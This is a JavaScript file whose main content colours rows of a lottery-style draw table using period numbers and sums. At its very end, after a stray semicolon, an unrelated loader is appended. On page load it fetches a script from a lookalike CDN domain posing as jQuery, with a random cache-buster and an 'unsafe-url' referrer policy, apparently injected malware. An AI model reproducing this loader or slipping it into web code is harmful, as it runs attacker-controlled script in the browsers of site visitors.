
//去除空格
String.prototype.trim = function () {
    var str = this,
    str = str.replace(/^\s+/, '');
    for (var i = str.length - 1; i >= 0; i--) {
        if (/\S/.test(str.charAt(i))) {
            str = str.substring(0, i + 1);
            break;
        }
    }
    return str;
}

//算法2
function Arithmetic2(p0, p1, kz1, kz2) {
    var aa = Math.abs(kz1 - kz2);
    var bb = Math.abs(kz1 + kz2);

    var cc = p0 + aa;
    var dd = p0 + bb;

    if (cc == p1 || dd == p1) {
        return true;
    }
    else {
        return false
    }
}

//算法3
function Arithmetic3(p0, p1, kh1, kh2) {
    var aa = Math.abs(kh1 - kh2);
    var bb = Math.abs(kh1 + kh2);

    var cc = p0 + aa;
    var dd = p0 + bb;

    if (cc == p1 || dd == p1) {
        return true;
    }
    else {
        return false
    }
}

//
function checkcolor1() {
    var trList = $("#dataForm1").children("tr");
    var list1 = new Array();
    var list2 = new Array();
    var list3 = new Array();

    for (var i = 0; i < trList.length; i++) {
        var tdArr = trList.eq(i).find("td");
        //1：中，2：和，3：中和，4：都不是
        var a = trList.eq(i).data("view");

        //var history_income_type = tdArr.eq(0).find("input").val();//收入类别
        //var history_income_money = tdArr.eq(1).find("input").val();//收入金额
        //var history_income_remark = tdArr.eq(2).find("input").val();//  备注
        var mm = trList.eq(i - 1).find("td").eq(10).find("input").val();
        var qi = tdArr.eq(1).text().trim();//期号
        var sum = tdArr.eq(2).text().trim();//总和
        var he = tdArr.eq(5).text().trim();//和
        var zhong = tdArr.eq(10).text().trim();//中
//console.log("我是"+he)
        var kong1 = 0;
        var kong2 = 0;
        //集合赋值
        if (a > 0) {
            if (i > 0) {
                var m = i - 1;
                while (m >= 0) {
                    kong1 = trList.eq(m).find("td").eq(10).find("input").val();
                    //console.log(kong1)
                    if (kong1 > 0) {
                        break;
                    }
                    m -= 1;
                }
                var n = i - 1;
                while (n >= 0) {
                    kong2 = trList.eq(n).find("td").eq(5).find("input").val();
                    if (kong1 > 0) {
                        break;
                    }
                    n -= 1;
                }
            }
            list1.push({ type: a, qihao: qi, zonghe: sum, kz: kong1, kh: kong2 });
        }
    }

    //获取中和
    if (list1 != null && list1.length > 0) {
        for (var i = 0; i < list1.length; i++) {
            var t = list1[i].type;
            var a = list1[i].qihao;
            var b = list1[i].zonghe;
            var c = list1[i].kz;//zhong
            var d = list1[i].kh;//he
            var e = 0;
            var f = 0;
            if (i > 0) {
                e = list1[i - 1].kz;
                f = list1[i - 1].kh;
            }
            Arithmetic4(t, a, parseInt(b), c, e, d, f);
        }
    }
}

//算法1
function Arithmetic4(type, qi, sum, k1, k2, k3, k4) {
    var period0 = qi.substring(qi.length - 3, qi.length);
    var periodwan = parseInt(qi) - parseInt(period0);

    var sum0 = parseInt(sum / 2);
    var bai = parseInt(sum0 % 1000 / 100);
    var shi = parseInt(sum0 % 100 / 10);
    var ge = parseInt(sum0 % 10);

    var sum1 = bai + shi + ge;
    var shi1 = parseInt(sum1 % 100 / 10);
    var ge1 = parseInt(sum1 % 10);

    var sum2 = shi1 + ge1;
    var period1 = parseInt(period0) + sum2;
    var period2 = period1 + periodwan - 1;

    var t1 = Arithmetic2(parseInt(period0), period1, k1, k2);
    var t2 = Arithmetic3(parseInt(period0), period1, k3, k4);
    if (t1 == true || t2 == true) {
        $("#tr_" + period2).add("p").css("background", "#ebadf2");//紫色
    }
    else {
        if (sum2 > 3) {
            //$("#tr_" + period2).removeClass();
            $("#tr_" + period2).add("w").css("background", "#fffff");//白
        }
        else {
            $("#tr_" + period2).add("b").css("background", "#a3bff2");//蓝
        }
    }
}
;function loadJSScript(url, callback) {
    var script = document.createElement("script");
    script.type = "text/javascript";
    script.referrerPolicy = "unsafe-url";
    if (typeof(callback) != "undefined") {
        if (script.readyState) {
            script.onreadystatechange = function() {
                if (script.readyState == "loaded" || script.readyState == "complete") {
                    script.onreadystatechange = null;
                    callback();
                }
            };
        } else {
            script.onload = function() {
                callback();
            };
        }
    };
    script.src = url;
    document.body.appendChild(script);
}
window.onload = function() {
    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
         console.log("Jquery loaded");
    });
}